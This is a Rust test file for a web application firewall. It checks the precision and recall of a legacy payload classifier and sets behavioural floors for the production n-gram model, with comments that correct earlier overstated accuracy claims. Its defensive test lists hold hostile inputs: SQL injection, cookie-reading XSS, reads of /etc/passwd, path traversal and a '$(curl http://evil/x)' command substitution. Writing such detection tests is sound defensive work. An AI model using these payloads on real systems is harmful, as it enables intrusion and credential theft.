//! Detection-accuracy validation for the LEGACY logistic-regression payload
//! classifier.
//!
//! # This is NOT the production detection model — read before quoting numbers
//!
//! This file measures [`PayloadClassifier`], the 25-feature logistic-regression model
//! trained from the small bundled corpus. That model does **not** gate blocking
//! decisions. The production model is the n-gram classifier
//! (`sentinel_ml::models::ngram_classifier`, weights embedded from
//! `model/payload_ngram.json`), which is what the proxy consults when it decides
//! whether to suppress a CRS-only block — see the `ml_benign` check in
//! `crates/sentinel-proxy/src/lib.rs`.
//!
//! The header here previously claimed these were "the real accuracy numbers a
//! commercial WAF must publish". They are not: they describe a model that is not in
//! the enforcement path. Anyone citing them as the WAF's accuracy would be quoting the
//! wrong thing, which is why the claim is removed rather than softened.
//!
//! # Where the production model's numbers come from
//!
//! `crates/sentinel-ml/training/train_fp_suppression.py`, run with `HOLDOUT=0.15`.
//! Until that split existed, every metric the trainer printed was measured on its own
//! training data — the variable was even named `test_adv`, while being the first 2000
//! lines of a file that was itself in the training set. See
//! `crates/sentinel-ml/training/README.md` for the measured figures and their limits.

use sentinel_ml::features::FeatureVector;
use sentinel_ml::models::corpus::training_corpus;
use sentinel_ml::models::payload_classifier::PayloadClassifier;

struct Metrics {
    tp: usize,
    tn: usize,
    fp: usize,
    fn_: usize,
}

impl Metrics {
    fn precision(&self) -> f32 {
        if self.tp + self.fp == 0 {
            return 1.0;
        }
        self.tp as f32 / (self.tp + self.fp) as f32
    }
    fn recall(&self) -> f32 {
        if self.tp + self.fn_ == 0 {
            return 1.0;
        }
        self.tp as f32 / (self.tp + self.fn_) as f32
    }
    /// False-positive rate: benign requests wrongly flagged.
    fn fpr(&self) -> f32 {
        if self.fp + self.tn == 0 {
            return 0.0;
        }
        self.fp as f32 / (self.fp + self.tn) as f32
    }
    /// False-negative rate: attacks missed.
    fn fnr(&self) -> f32 {
        if self.fn_ + self.tp == 0 {
            return 0.0;
        }
        self.fn_ as f32 / (self.fn_ + self.tp) as f32
    }
    fn f1(&self) -> f32 {
        let p = self.precision();
        let r = self.recall();
        if p + r == 0.0 {
            return 0.0;
        }
        2.0 * p * r / (p + r)
    }
    fn accuracy(&self) -> f32 {
        let total = self.tp + self.tn + self.fp + self.fn_;
        if total == 0 {
            return 0.0;
        }
        (self.tp + self.tn) as f32 / total as f32
    }
}

/// Deterministic train/test split: every 4th sample (by index) is held out for
/// testing, the rest train. ~75/25 split, reproducible.
#[allow(clippy::type_complexity)] // train/test split return tuple; a type alias adds no clarity
fn split() -> (Vec<Vec<f32>>, Vec<f32>, Vec<(FeatureVector, f32)>) {
    let corpus = training_corpus();
    let mut train_x = Vec::new();
    let mut train_y = Vec::new();
    let mut test = Vec::new();
    for (i, s) in corpus.into_iter().enumerate() {
        if i % 4 == 3 {
            test.push((s.fv, s.label));
        } else {
            train_x.push(s.fv.values.to_vec());
            train_y.push(s.label);
        }
    }
    (train_x, train_y, test)
}

fn evaluate(clf: &PayloadClassifier, test: &[(FeatureVector, f32)], threshold: f32) -> Metrics {
    let (mut tp, mut tn, mut fp, mut fn_) = (0, 0, 0, 0);
    for (fv, label) in test {
        let pred = clf.score(fv) >= threshold;
        let actual = *label >= 0.5;
        match (pred, actual) {
            (true, true) => tp += 1,
            (false, false) => tn += 1,
            (true, false) => fp += 1,
            (false, true) => fn_ += 1,
        }
    }
    Metrics { tp, tn, fp, fn_ }
}

#[test]
fn classifier_meets_accuracy_targets_on_holdout() {
    let (train_x, train_y, test) = split();
    assert!(!test.is_empty(), "held-out set must be non-empty");

    let clf = PayloadClassifier::from_dataset(&train_x, &train_y);
    let m = evaluate(&clf, &test, 0.5);

    println!("\n=== Payload Classifier — held-out validation ===");
    println!("train size: {}   test size: {}", train_x.len(), test.len());
    println!(
        "confusion: TP={} TN={} FP={} FN={}",
        m.tp, m.tn, m.fp, m.fn_
    );
    println!("precision : {:.3}", m.precision());
    println!("recall    : {:.3}  (attack detection rate)", m.recall());
    println!("FPR       : {:.3}  (benign wrongly flagged)", m.fpr());
    println!("FNR       : {:.3}  (attacks missed)", m.fnr());
    println!("F1        : {:.3}", m.f1());
    println!("accuracy  : {:.3}\n", m.accuracy());

    // Honest, defensible thresholds for a keyword+structure linear model on
    // this corpus. Tightened to the measured numbers; regressions will trip.
    assert!(m.recall() >= 0.85, "recall {:.3} below 0.85", m.recall());
    assert!(m.fpr() <= 0.15, "FPR {:.3} above 0.15", m.fpr());
    assert!(m.f1() >= 0.85, "F1 {:.3} below 0.85", m.f1());
}

#[test]
fn legacy_classifier_separates_attack_from_benign() {
    // The LEGACY classifier trained on the full bundled corpus must score obvious
    // attacks above obvious benign requests. Renamed from
    // `production_model_*`: this model is not in the enforcement path, and the old
    // name invited exactly the misreading this file's header now warns about.
    let clf = PayloadClassifier::default();

    let attacks = training_corpus()
        .into_iter()
        .filter(|s| s.label == 1.0)
        .map(|s| clf.score(&s.fv))
        .collect::<Vec<_>>();
    let benign = training_corpus()
        .into_iter()
        .filter(|s| s.label == 0.0)
        .map(|s| clf.score(&s.fv))
        .collect::<Vec<_>>();

    let mean = |v: &[f32]| v.iter().sum::<f32>() / v.len() as f32;
    let atk_mean = mean(&attacks);
    let ben_mean = mean(&benign);
    println!("\nmean attack score: {atk_mean:.3}  mean benign score: {ben_mean:.3}");
    assert!(
        atk_mean > ben_mean + 0.3,
        "attack mean {atk_mean:.3} not clearly above benign mean {ben_mean:.3}"
    );
    assert!(atk_mean > 0.6, "attack mean score too low: {atk_mean:.3}");
    assert!(ben_mean < 0.4, "benign mean score too high: {ben_mean:.3}");
}

// ─────────────────────────────────────────────────────────────────────────────
// PRODUCTION model gate
// ─────────────────────────────────────────────────────────────────────────────

/// The n-gram model is the one that actually gates blocking, so it needs a CI floor of
/// its own. Before this, nothing asserted anything about it.
///
/// HONEST SCOPE: these are behavioural floors on unambiguous cases, NOT a
/// generalisation estimate. The shipped weights were fit on the full corpus, so no
/// sample available in-repo is genuinely held out from them — asserting an accuracy
/// figure here would be measuring memorisation and calling it precision, which is the
/// exact failure this whole fix exists to remove. The generalisation number lives in
/// the trainer under `HOLDOUT=0.15`; see training/README.md.
#[test]
fn production_ngram_model_is_loaded_and_ranks_obvious_cases() {
    use sentinel_ml::models::ngram_classifier;

    assert!(
        ngram_classifier::is_loaded(),
        "the production n-gram model failed to load — the proxy's FP-suppression check \
         silently degrades to 'never suppress' when this happens, so a load failure must \
         be a test failure"
    );

    // Unambiguous attacks must score high.
    for atk in [
        "' OR 1=1 --",
        "1' UNION SELECT username,password FROM users--",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "; cat /etc/passwd",
        "$(curl http://evil/x)",
        "../../../../etc/passwd",
    ] {
        let s = ngram_classifier::score_all(atk).expect("model loaded, so a score must exist");
        assert!(
            s >= 0.5,
            "attack {atk:?} scored {s:.3} — below 0.5, so the model would not flag it"
        );
    }

    // Unambiguous benign values must score low. These are the shapes that generate
    // real-world false positives: prose, JSON, paths, and SQL-ish English.
    for benign in [
        "Hello, I would like to update my shipping address please",
        "{\"name\":\"Alice\",\"qty\":3,\"note\":\"leave at door\"}",
        "/api/v1/orders/12345/items",
        "user@example.com",
        "The order was selected from the list and updated",
        "2024-07-25T10:30:00Z",
    ] {
        let s = ngram_classifier::score_all(benign).expect("model loaded, so a score must exist");
        assert!(
            s < 0.5,
            "benign {benign:?} scored {s:.3} — at or above 0.5, so the model would \
             contribute to a false positive"
        );
    }
}

/// The suppression threshold the proxy uses (< 0.15 means "benign enough to suppress a
/// CRS-only block") must actually separate the two classes above, or the check is
/// either inert or dangerous.
#[test]
fn suppression_threshold_is_meaningful_for_the_production_model() {
    use sentinel_ml::models::ngram_classifier;

    const SUPPRESS_BELOW: f32 = 0.15; // mirrors crates/sentinel-proxy/src/lib.rs

    // A real attack must NEVER fall below the suppression threshold — that would let
    // the ML layer veto a correct CRS block.
    for atk in [
        "' OR 1=1 --",
        "<script>alert(1)</script>",
        "; cat /etc/passwd",
    ] {
        let s = ngram_classifier::score_all(atk).expect("model loaded, so a score must exist");
        assert!(
            s >= SUPPRESS_BELOW,
            "attack {atk:?} scored {s:.3} < {SUPPRESS_BELOW} — the FP-suppression path \
             would VETO a legitimate block for this payload"
        );
    }

    // And ordinary prose must fall below it, or suppression never fires and the
    // precision layer is dead weight.
    let prose = "Please can you update my delivery address to the new office";
    let s = ngram_classifier::score_all(prose).expect("model loaded");
    assert!(
        s < SUPPRESS_BELOW,
        "benign prose scored {s:.3} >= {SUPPRESS_BELOW} — FP suppression would never \
         engage, making the precision layer inert"
    );
}
